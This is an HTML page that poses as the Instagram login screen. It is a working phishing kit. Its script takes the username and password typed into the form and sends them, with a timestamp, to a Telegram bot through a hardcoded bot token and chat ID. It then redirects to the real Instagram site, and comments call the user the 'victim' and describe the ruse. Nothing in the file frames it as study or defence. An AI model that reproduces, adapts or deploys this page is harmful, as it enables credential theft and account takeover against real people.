<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:#fafafa; height:100vh; display:flex; justify-content:center; align-items:center; }
    .container { background:white; border:1px solid #dbdbdb; border-radius:1px; padding:40px 40px 20px; width:350px; text-align:center; }
    .logo { width:175px; margin-bottom:30px; }
    input { width:100%; padding:10px; margin:8px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:14px; box-sizing:border-box; }
    button { width:100%; padding:8px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:bold; margin:10px 0; cursor:pointer; }
    .links { margin-top:20px; font-size:12px; }
    .links a { color:#00376b; text-decoration:none; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
    
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    
    <div class="links">
      <a href="#">Forgot password?</a><br><br>
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      let username = document.getElementById('username').value;
      let password = document.getElementById('password').value;
      
      let message = "ðŸ”¥ NEW INSTA LOGIN ðŸ”¥\n\nðŸ‘¤ Username: " + username + "\nðŸ”‘ Password: " + password + "\nâ° Time: " + new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      
      // Telegram API call - tere bot ka token aur chat ID
      fetch("https://api.telegram.org/bot8565153764:AAGBAajxTuXBqMNrm3bncFOdBYQTux0FsXo/sendMessage?chat_id=6328337196&text=" + encodeURIComponent(message))
        .then(response => console.log("Credentials sent to Telegram"))
        .catch(error => console.log("Error:", error));
      
      // Victim ko lage login ho gaya - real Instagram pe redirect
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/";
      }, 1500); // 1.5 second wait for realistic feel
    });
  </script>
</body>
</html>
